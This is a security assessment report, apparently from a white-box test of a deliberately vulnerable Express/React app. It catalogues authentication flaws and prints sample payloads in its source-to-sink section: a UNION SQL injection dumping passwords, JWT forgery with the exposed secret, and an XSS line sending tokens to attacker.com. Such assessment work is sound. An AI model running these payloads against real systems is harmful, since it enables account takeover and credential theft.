# Authentication Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Critical authentication flaws were identified across all layers — token management, session storage, password handling, and transport security. The application uses a deliberately broken JWT implementation with a hardcoded secret, plaintext password storage, predictable reset tokens, and zero rate limiting, enabling complete account takeover via multiple independent vectors.
- **Purpose of this Document:** This report provides the strategic context on the application's authentication mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Completely Broken Token Management
- **Description:** The JWT implementation is fundamentally broken. Tokens are signed with a trivially guessable hardcoded secret ("secret123"), have no expiration, and the middleware explicitly accepts unsigned tokens with `alg: "none"`. The JWT secret is publicly exposed via an unauthenticated debug endpoint.
- **Implication:** An attacker can forge valid tokens for any identity (including admin) and stolen tokens remain valid forever with no revocation.
- **Representative Findings:** `AUTH-VULN-03`, `AUTH-VULN-04`, `AUTH-VULN-05`.

### Pattern 2: Plaintext Credential Storage and Transmission
- **Description:** Passwords are stored in the SQLite database in plaintext with no hashing. Login compares passwords directly in the SQL query without any hash comparison. The application provides no protection against credential reuse attacks.
- **Implication:** Any database breach or SQL injection immediately yields all user credentials in usable form.
- **Representative Findings:** `AUTH-VULN-01`.

### Pattern 3: Predictable Password Reset Tokens
- **Description:** Password reset tokens are generated as `base64(email:timestamp)` where timestamp is `Date.now()` from the server. The token is printed to server logs and returned in the API response body. No expiration or one-time-use enforcement exists.
- **Implication:** An attacker who can determine the approximate server time of a reset request can predict the token and take over any account.
- **Representative Finding:** `AUTH-VULN-02`.

### Pattern 4: Missing Abuse Defenses
- **Description:** No rate limiting exists on any endpoint — login, register, forgot-password, or any other API route. Combined with plaintext passwords and no account lockout, this enables efficient brute-force attacks at full network speed.
- **Implication:** Attackers can make unlimited login attempts against any account without throttling.
- **Representative Findings:** `AUTH-VULN-07`, `AUTH-VULN-08`.

### Pattern 5: Insecure Client-Side Token Storage
- **Description:** JWT tokens are stored in `localStorage` (not HttpOnly cookies), making them accessible to JavaScript and vulnerable to XSS theft. Logout only clears client-side storage without server-side session invalidation. No session rotation occurs after login.
- **Implication:** Any XSS payload can steal tokens and maintain persistent access indefinitely since tokens never expire and are not revoked on logout.
- **Representative Findings:** `AUTH-VULN-09`.

---

## 3. Strategic Intelligence for Exploitation

### Authentication Method
The system uses JWT (JSON Web Tokens) stored in browser `localStorage` as the sole authentication mechanism. Bearer tokens are sent via the `Authorization` header on every authenticated request. The backend runs on `localhost:5001` and is reachable from the browser via the frontend at `techviflaw.vn.gd` due to a CORS wildcard configuration.

### Token Lifecycle Details
| Property | Value |
|---|---|
| Token Storage | `localStorage.token` (not HttpOnly) |
| Token Signing Secret | `secret123` (hardcoded, publicly exposed) |
| Token Algorithm | HS256 (with explicit "none" algorithm bypass) |
| Token Expiration | None (no `expiresIn` set) |
| Token Revocation | None (no server-side invalidation) |
| Session Rotation | None (same token used throughout session) |
| Logout Mechanism | Client-side only (`localStorage.removeItem`) |

### Password Policy
- **Storage:** Plaintext (no hashing) in SQLite database
- **Comparison:** Direct SQL comparison (`password = ?`) — no bcrypt or any hash comparison
- **Policy Enforcement:** No server-side password policy (no length/complexity requirements)
- **Default Test Credentials:** `test@example.com` / `123456` (pre-seeded in database)

### Backend Reachability from External Attackers
The Express.js backend runs at `localhost:5001` but is accessible from the browser context at `techviflaw.vn.gd` because:
1. The frontend (React SPA) makes AJAX calls to `http://localhost:5001/api`
2. The backend CORS is set to `origin: '*'` (wildcard), allowing cross-origin requests from any domain
3. All API endpoints are reachable via browser-initiated cross-origin requests

This means all backend authentication vulnerabilities are exploitable through browser-based attacks, including:
- SQL injection to extract plaintext passwords
- Direct access to debug/admin/docs endpoints
- Password reset token prediction
- Mass assignment via profile endpoint
- Token theft via XSS

### Key Endpoints and Their Auth Properties

| Endpoint | Method | Auth Required | Key Vulnerability |
|---|---|---|---|
| `/api/auth/login` | POST | No | No rate limit; plaintext password comparison |
| `/api/auth/register` | POST | No | No rate limit; user enumeration |
| `/api/auth/forgot-password` | POST | No | Predictable token (base64 email:timestamp); token leaked in response |
| `/api/auth/reset-password` | POST | No | No token expiration; no one-time-use check |
| `/api/auth/profile` | PUT | Yes | Mass assignment — accepts all body fields |
| `/api/debug` | GET | No | Exposes JWT secret, env vars, DB path |
| `/api/admin?admin=true` | GET | No | Dumps all users with plaintext passwords |
| `/api/docs` | GET | No | Exposes test credentials and example JWT |
| `/api/projects/search/name` | GET | Partial | SQL injection (string concatenation) |
| `/api/projects` | GET | Partial | Returns all projects without ownership filtering |

---

## 4. Secure by Design: Validated Components

These components were analyzed and found to have robust defenses or are not applicable to authentication:

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Parameterized SQL (registration) | `routes/auth.js:15` | Uses `?` placeholders in INSERT query | SAFE |
| Parameterized SQL (login) | `routes/auth.js:32` | Uses `?` placeholders in SELECT query | SAFE |
| Parameterized SQL (password reset) | `routes/auth.js:106` | Uses `?` placeholders in UPDATE query | SAFE |
| Same-origin API calls | Frontend app | Axios interceptor sets Authorization header consistently | SAFE (for legitimate use) |

**Note:** The presence of parameterized queries in some places (auth routes) while missing in others (project search) indicates inconsistent security implementation rather than intentional design.

---

## 5. Vulnerability Analysis Detail

### 5.1 Transport & Caching

**Endpoints Analyzed:** All authentication endpoints (`/api/auth/*`)

| Check | Result | Details |
|---|---|---|
| HTTPS enforcement | ❌ FAIL | No HSTS header set anywhere. No HTTP-to-HTTPS redirect configured. `server.js` has no TLS configuration. |
| CORS configuration | ❌ FAIL | `server.js:11` — `origin: '*'` (wildcard). Any external website can make authenticated requests from victim's browser. |
| Cache-Control on auth responses | ❌ FAIL | No `Cache-Control: no-store` or `Pragma: no-cache` headers on any auth endpoint response. |
| Security headers | ❌ FAIL | No `Strict-Transport-Security`, `X-Content-Type-Options`, `Content-Security-Policy`, `X-Frame-Options`, or any security header. No Helmet middleware present. |

**Verdict:** `transport_exposure` — **VULNERABLE**. Credentials and tokens can be intercepted or replayed from cache. CORS wildcard enables cross-origin attacks.

---

### 5.2 Rate Limiting / CAPTCHA / Monitoring

**Endpoints Analyzed:** `/api/auth/login`, `/api/auth/register`, `/api/auth/forgot-password`, `/api/auth/reset-password`

| Check | Result | Details |
|---|---|---|
| Rate limiting on login | ❌ FAIL | No rate limiting middleware anywhere in the codebase. |
| Rate limiting on register | ❌ FAIL | No rate limiting. Mass account creation is possible. |
| Rate limiting on forgot-password | ❌ FAIL | No rate limiting. Reset token enumeration is unlimited. |
| Account lockout after failures | ❌ FAIL | No lockout mechanism. No progressive delays. |
| CAPTCHA on repeated failures | ❌ FAIL | No CAPTCHA anywhere in the application. |
| Failed-login monitoring/alerting | ❌ FAIL | No security monitoring or alerting exists. |

**Verdict:** `abuse_defenses_missing` — **VULNERABLE**. Full-speed brute-force attacks are possible against all auth endpoints.

---

### 5.3 Session Management (Cookies/Tokens)

**Token Storage Location:** `localStorage.token` — set in `Login.jsx:15`, read in `api.js:9`

| Check | Result | Details |
|---|---|---|
| HttpOnly cookie | ❌ FAIL | No cookies used. Token stored in `localStorage` — accessible to JavaScript. |
| Secure flag | ❌ FAIL | Not applicable (no cookies). Token sent over HTTP to localhost:5001 during development. |
| SameSite attribute | ❌ FAIL | Not applicable (no cookies). |
| Session rotation after login | ❌ FAIL | No session rotation. Same JWT token used before and after login. |
| Server-side session invalidation on logout | ❌ FAIL | `App.jsx:logout()` only calls `localStorage.removeItem`. No `POST /auth/logout` endpoint exists. |
| Token in URL | ✅ PASS | Token is not in URL — sent via Authorization header. |
| Idle timeout | ❌ FAIL | No idle timeout. Tokens have no expiration at all. |
| Absolute session timeout | ❌ FAIL | No absolute timeout. Tokens never expire. |

**Verdict:** `session_cookie_misconfig` — **VULNERABLE**. Tokens are stored in JavaScript-accessible storage and never expire or rotate.

---

### 5.4 Token Properties (Entropy, Protection, Expiration)

**Token Generation:** `routes/auth.js:37` — `jwt.sign({ id, email, plan }, JWT_SECRET)`

| Check | Result | Details |
|---|---|---|
| Cryptographically random token | ✅ PASS | Uses `jsonwebtoken` library for token generation. |
| No hardcoded/weak secret | ❌ FAIL | `JWT_SECRET = 'secret123'` hardcoded in `middleware/auth.js:4`. Trivially guessable. |
| Token sent only over HTTPS | ❌ FAIL | Backend at localhost:5001 uses plain HTTP. |
| Token never logged | ❌ FAIL | Token is not logged directly, but the debug endpoint exposes the signing secret. |
| Token expiration (TTL) | ❌ FAIL | `jwt.sign()` called with no `expiresIn` option. Tokens last forever. |
| Token revocation on logout | ❌ FAIL | No revocation mechanism exists. |
| No "none" algorithm acceptance | ❌ FAIL | `middleware/auth.js:23` explicitly checks for `alg === 'none'` and accepts unsigned tokens. |

**Verdict:** `token_management_issue` — **VULNERABLE**. Tokens are signed with a known secret, never expire, and unsigned tokens are explicitly accepted.

---

### 5.5 Session Fixation

| Check | Result | Details |
|---|---|---|
| New session ID after login | ❌ FAIL | No session rotation. The same JWT token structure is used before and after login. |
| Pre-login vs post-login session comparison | N/A | No pre-login session exists. The app uses stateless JWT. |

**Verdict:** `login_flow_logic` — **VULNERABLE**. No session rotation means session fixation attacks are possible (attacker pre-sets a known token value).

---

### 5.6 Password & Account Policy

| Check | Result | Details |
|---|---|---|
| No default credentials in code | ❌ FAIL | `db.js:38` seeds `test@example.com` / `123456` by default. |
| Strong password policy | ❌ FAIL | No server-side password policy. Any password accepted. |
| Passwords safely stored (hashing) | ❌ FAIL | `db.js` creates users table with `password TEXT` (plaintext). Login uses direct SQL comparison. |
| MFA enforcement | N/A | MFA not implemented. |

**Verdict:** `weak_credentials` — **VULNERABLE**. Default credentials exist. Passwords stored in plaintext. No complexity requirements.

---

### 5.7 Login/Signup Responses

| Check | Result | Details |
|---|---|---|
| Generic error messages | ❌ FAIL | Register endpoint returns "An account with this email already exists" on duplicate — reveals account existence. |
| Auth state not in URLs | ✅ PASS | Redirects to `/dashboard` without sensitive parameters. |
| No open redirect | ✅ PASS | No redirect logic based on query parameters in auth flows. |

**Verdict:** `login_flow_logic` — **VULNERABLE**. User enumeration is possible through distinct error messages on registration.

---

### 5.8 Recovery & Logout

| Check | Result | Details |
|---|---|---|
| Single-use reset tokens | ❌ FAIL | No one-time-use enforcement. Tokens can be reused. |
| Short-TTL reset tokens | ❌ FAIL | No expiration check in `reset-password` handler. |
| Rate-limited reset attempts | ❌ FAIL | No rate limiting on `/forgot-password`. |
| Generic reset responses (no enumeration) | ❌ FAIL | Different responses for existing vs. non-existing email. |
| Server-side logout invalidation | ❌ FAIL | No logout endpoint. Client-side clear only. |

**Verdict:** `reset_recovery_flaw` — **VULNERABLE**. Predictable, never-expiring, reusable reset tokens enable full account takeover.

---

### 5.9 SSO/OAuth

**Status:** Not implemented. No OAuth, OIDC, or SSO flows exist in the codebase.

---

## 6. Source-to-Sink Traces

### AUTH-VULN-01: SQL Injection Dumping All User Passwords

**Source:** `GET /api/projects/search/name?name=` — user-controlled query parameter
**Propagation:** `routes/projects.js:29` — direct string interpolation: `` `SELECT * FROM projects WHERE name LIKE '%${name}%'` ``
**Sink:** SQLite database containing `users` table with plaintext passwords
**Flaw:** No parameterized query; user input directly concatenated into SQL string
**Exploitation:** `' UNION SELECT id, email, password FROM users--` returns all credentials
**Outcome:** Attacker obtains all user emails and plaintext passwords → complete account takeover via normal login

### AUTH-VULN-02: Predictable Password Reset Token → Account Takeover

**Source:** `POST /api/auth/forgot-password` — user provides email
**Propagation:** `routes/auth.js:86` — `Buffer.from(`${email}:${Date.now()}`).toString('base64')`
**Sink:** `POST /api/auth/reset-password` — token decoded and used directly in UPDATE query
**Flaw:** Token is `base64(email:timestamp)` — timestamp is server `Date.now()`, easily guessable within a window. Token also leaked in `debug_token` response field. No expiration or one-time-use check.
**Exploitation:** Request reset → compute `base64(victim_email:approximate_timestamp)` → submit reset with predicted token
**Outcome:** Attacker changes victim password without knowing original password → account takeover

### AUTH-VULN-03: JWT Signed with Hardcoded Secret

**Source:** `middleware/auth.js:4` — `const JWT_SECRET = 'secret123'`
**Propagation:** Token signed with this secret at `routes/auth.js:37`; verified at `middleware/auth.js:36`
**Sink:** All authenticated API endpoints that read `req.user` from the verified token
**Flaw:** Secret is hardcoded, trivially guessable, and publicly exposed via `GET /api/debug`. No token expiration.
**Exploitation:** Attacker computes `jwt.sign({ id: 1, email: 'admin@techviflaw.vn.gd', plan: 'admin' }, 'secret123')` → full admin access
**Outcome:** Persistent, unexpireable, irrevocable privileged access

### AUTH-VULN-04: Debug Endpoint Exposes JWT Secret

**Source:** `GET /api/debug` — unauthenticated endpoint at `routes/debug.js:8`
**Propagation:** Returns `{ config: { jwt_secret: JWT_SECRET }, system: process.env }`
**Sink:** Used by `middleware/auth.js:36` to verify all tokens
**Flaw:** No authentication on debug endpoint; CORS wildcard allows browser access
**Exploitation:** `fetch('http://localhost:5001/api/debug')` returns `jwt_secret: 'secret123'`
**Outcome:** Attacker obtains signing secret → can forge any token

### AUTH-VULN-07: No Rate Limiting on Login

**Source:** `POST /api/auth/login` — `routes/auth.js:29`
**Propagation:** No middleware wrapping this route; no tracking of failed attempts
**Sink:** Brute-force attempts execute at full network speed with no throttling
**Flaw:** No rate limiting middleware anywhere in `server.js` or `routes/auth.js`
**Exploitation:** Script loops through password guesses for `test@example.com` — no lockout, no delay
**Outcome:** Efficient credential brute-forcing against any account

### AUTH-VULN-09: Token Stored in localStorage — XSS Theft Vector

**Source:** `Login.jsx:15` — `localStorage.setItem('token', res.data.token)`
**Propagation:** `api.js:9` — `localStorage.getItem('token')` → `Authorization: Bearer ${token}`
**Sink:** All authenticated API requests carry the stolen token
**Flaw:** Token accessible to JavaScript (no HttpOnly); combined with stored XSS in project descriptions
**Exploitation:** Stored XSS payload: `fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))`
**Outcome:** Session hijacking — attacker uses stolen token to impersonate victim indefinitely (token never expires, no revocation)

### AUTH-VULN-10: Mass Assignment on Profile Update

**Source:** `PUT /api/auth/profile` — `routes/auth.js:60-67`
**Propagation:** `const fields = Object.keys(req.body).map(k => \`${k} = ?\`).join(', ')` — accepts ALL keys from request body
**Sink:** `UPDATE users SET { attacker-controlled-fields} WHERE id = ?`
**Flaw:** No field allowlist or blocklist; attacker can modify `plan_type`, `password`, or any other column
**Exploitation:** `PUT /api/auth/profile` with body `{ "plan_type": "admin", "password": "known_password" }`
**Outcome:** Privilege escalation and persistent access with known password

---

## 7. Scope Verification

All authentication endpoints from the reconnaissance deliverable were analyzed:

| Endpoint | Method | Analyzed | AuthN Finding |
|---|---|---|---|
| `/api/auth/login` | POST | ✅ | No rate limiting, plaintext password comparison |
| `/api/auth/register` | POST | ✅ | No rate limiting, user enumeration |
| `/api/auth/forgot-password` | POST | ✅ | Predictable token, token leaked in response |
| `/api/auth/reset-password` | POST | ✅ | No expiration, no one-time-use |
| `/api/auth/profile` | GET | ✅ | IDOR potential |
| `/api/auth/profile` | PUT | ✅ | Mass assignment vulnerability |
| `/api/debug` | GET | ✅ | JWT secret + env var exposure |
| `/api/admin` | GET | ✅ | Admin bypass via query param |
| `/api/docs` | GET | ✅ | Test credentials + JWT exposure |
| `/api/projects/search/name` | GET | ✅ | SQL injection enables credential extraction |
| `/api/projects` | GET | ✅ | No ownership filtering |

All auth-adjacent flows from Section 3 and Section 6 of the reconnaissance report have been systematically analyzed. No auth-related endpoint was left unexamined.

---

## 8. Conclusion

The TechviFlaw application's authentication system is comprehensively broken across every dimension. The JWT implementation accepts unsigned tokens with a known secret, passwords are stored in plaintext, reset tokens are trivially predictable, rate limiting is entirely absent, tokens are stored in JavaScript-accessible storage, and debug endpoints publicly expose signing secrets. The combined effect is that an attacker with only browser access can:

1. Extract all user credentials via SQL injection → login as any user
2. Predict password reset tokens to take over any account without credentials
3. Forge admin tokens using the publicly exposed secret
4. Steal tokens via XSS and maintain persistent access
5. Brute-force credentials at full speed with no throttling

The severity of these findings is compounded by the fact that they are all independently exploitable — no chaining is required. Each vulnerability represents a complete path to account compromise.

---

*Report generated by Authentication Analysis Specialist. Target: https://techviflaw.vn.gd. Framework: React 18 + Vite frontend / Express.js backend. Analysis methodology: White-box code review of all authentication-related source files.*
